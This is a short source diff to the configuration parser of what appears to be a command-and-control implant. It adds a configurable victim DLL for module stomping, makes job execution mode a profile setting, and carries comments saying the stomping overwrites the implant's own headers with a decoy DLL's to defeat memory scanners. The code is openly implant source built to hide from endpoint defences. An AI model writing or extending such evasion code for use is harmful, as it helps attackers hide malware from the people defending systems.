@@ -681,15 +681,23 @@ VOID DemonConfig()
      * Controlled by the HeapEnc profile key (default: TRUE). */
     Instance->Config.Implant.HeapEnc = ParserGetInt32( &Parser );
 
-    /* ARC-05: module stomping for injected DLL payload — default ON.
-     * Overwrites Archon's own PE headers with a decoy DLL's headers
-     * after initialization to defeat memory scanners. */
-    Instance->Config.Implant.ModuleStomp = TRUE;
+    /* ARC-09: job execution mode — 0 = dedicated thread, 1 = NT thread pool. */
+    Instance->Config.Implant.JobExecution = (BYTE) ParserGetInt32( &Parser );
 
-    /* ARC-09: job execution mode — default to per-thread for compatibility.
-     * When the teamserver gains JobExecution profile-key support it will be
-     * appended to the config blob and parsed here instead of hardcoded. */
-    Instance->Config.Implant.JobExecution = JOB_EXEC_THREAD;
+    /* ARC-05: StompDll — optional victim DLL name for module stomping.
+     * Empty wstring (length == sizeof(WCHAR)) means auto-select from PEB. */
+    {
+        DWORD StompDllLen = 0;
+        PVOID StompDllBuf = ParserGetBytes( &Parser, &StompDllLen );
+        if ( StompDllLen > sizeof(WCHAR) ) {
+            Instance->Config.Inject.StompDll = Instance->Win32.LocalAlloc( LPTR, StompDllLen );
+            MemCopy( Instance->Config.Inject.StompDll, StompDllBuf, StompDllLen );
+        } else {
+            Instance->Config.Inject.StompDll = NULL;
+        }
+    }
+
+    Instance->Config.Implant.ModuleStomp = TRUE;
 
     PRINTF(
         "[CONFIG] Sleep Obfuscation: \n"
